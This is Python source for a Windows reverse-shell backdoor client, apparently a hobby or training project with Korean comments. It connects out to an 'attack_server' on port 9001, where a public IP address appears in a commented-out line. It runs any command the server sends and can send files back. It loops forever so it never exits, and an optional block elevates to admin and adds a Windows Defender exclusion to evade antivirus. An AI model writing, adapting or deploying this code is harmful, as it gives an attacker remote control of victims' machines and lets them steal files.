import os,socket,subprocess
import time,sys
import win32com.shell.shell as shell

DEBUG=True
UAC_BYPASS=False
### UAC to get Admins

def debug_print(str):
    if(DEBUG):
        print(str)

def debug_pause():
    if(DEBUG):
        os.system('pause')

debug_print("hello debug!")
if(UAC_BYPASS):
    if sys.argv[-1] != 'asadmin':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script]+sys.argv[1:]+['asadmin'])
        shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
        sys.exit(0)

    script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
    subprocess.call(script,shell=True) #다른프로세스로 실행되기때문에, vscode 또는 cmd 출력을 사용할 수 없습니다.
#os.system("pause")

#### payload


port = 9001 #port of attack_server
#host_addr = "175.192.214.36" #address of attack_server
host_addr = "127.0.0.1" 
debug_print("client start...")


while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((host_addr, port))
            debug_print(f"connected to {host_addr},{port}")
            while True:
                debug_print("wait for server message...")
                server_cmd = sock.recv(10000).decode()  # recv server command
                debug_print(f"server sended : {server_cmd}")
                if(server_cmd[:2]=="cd"):
                    os.chdir(str(server_cmd[3:]))
                    output=os.getcwd()
                if(server_cmd[:2]=="ft"):
                    debug_print("file transfer command recved...")
                    file_path = os.path.join(os.getcwd(),server_cmd[3:])
                    print(file_path)
                    with open(file_path,'rb') as f:
                        file_content = f.read()
                        file_name = file_path.split('/')[-1]
                        file_size = len(file_content)
                        sock.sendall(f'{file_name} {file_size}'.encode())
                        sock.sendall(file_content)
                else:
                    output=subprocess.getoutput(server_cmd)
                debug_print(f"output: /{output}/")
                if(output==''): #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
                    sock.send("null...".encode())
                sock.send(output.encode()) # send terminal output to server
                debug_print("sended!")
                
    except Exception as e:
        debug_print(e)
        pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.
        
